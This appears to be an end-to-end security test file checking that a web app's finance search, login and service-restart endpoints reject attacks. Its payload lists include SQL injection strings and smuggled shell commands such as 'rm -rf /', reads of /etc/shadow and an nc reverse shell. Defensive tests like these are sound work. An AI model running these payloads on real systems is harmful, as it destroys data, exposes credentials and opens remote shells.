import { describe, test, expect } from 'bun:test';
import { MASTER_TOKEN, getAuthHeaders, requestJson } from './helpers';

describe('Adversarial Security & Zero-Trust Hardening (E2E)', () => {
  describe('SQL Injection & Payload Sanitization Defense', () => {
    const sqliPayloads = [
      "' OR 1=1 --",
      "'; DROP TABLE transaksi; --",
      "1 UNION SELECT null, username, password_hash, null, null, null, null FROM users --",
      "' OR 'a'='a",
      `" OR "1"="1`,
    ];

    for (const payload of sqliPayloads) {
      test(`Keuangan search query resists SQL injection: "${payload}"`, async () => {
        const res = await requestJson(`/api/v1/keuangan?q=${encodeURIComponent(payload)}`, {
          headers: getAuthHeaders(),
        });
        expect(res.status).toBe(200);
        expect(res.data.success).toBe(true);
        expect(Array.isArray(res.data.transactions)).toBe(true);
      });
    }

    for (const payload of sqliPayloads) {
      test(`Auth login identifier resists SQL injection: "${payload}"`, async () => {
        const res = await requestJson('/api/v1/auth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'login',
            identifier: payload,
            password: 'arbitrary_password',
          }),
        });
        // Must either be 403 Forbidden or 400 Bad Request, NEVER 200 Admin
        expect(res.status).toBe(403);
      });
    }
  });

  describe('Command Injection & Path Traversal Resistance', () => {
    const maliciousServices = [
      'caddy; rm -rf /',
      'apu-webid && cat /etc/shadow',
      '../../../etc/passwd',
      '$(reboot)',
      '`id`',
      'caddy | nc -e /bin/sh 10.0.0.1 4444',
    ];

    for (const svc of maliciousServices) {
      test(`Process daemon control rejects malicious service payload: "${svc}"`, async () => {
        const res = await requestJson('/api/v1/processes', {
          method: 'POST',
          headers: getAuthHeaders(),
          body: JSON.stringify({
            action: 'restart_service',
            serviceName: svc,
          }),
        });

        // Must reject with 400 or 403
        expect([400, 403]).toContain(res.status);
        expect(res.data.success).toBe(false);
      });
    }
  });

  describe('Privilege Escalation & Unauthorized Access', () => {
    test('Unauthenticated user cannot trigger user approvals', async () => {
      const res = await requestJson('/api/v1/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'approve_user',
          userId: '1',
        }),
      });

      expect(res.status).toBe(403);
      expect(res.data.error).toBe('Forbidden');
    });

    test('Unauthenticated user cannot trigger service restarts', async () => {
      const res = await requestJson('/api/v1/processes', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'restart_service',
          serviceName: 'caddy',
        }),
      });

      expect(res.status).toBe(403);
      expect(res.data.error).toBe('Forbidden');
    });

    test('Unauthenticated user cannot clear finance transactions', async () => {
      const res = await requestJson('/api/v1/keuangan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'clear' }),
      });

      expect(res.status).toBe(403);
      expect(res.data.error).toBe('Forbidden');
    });
  });
});
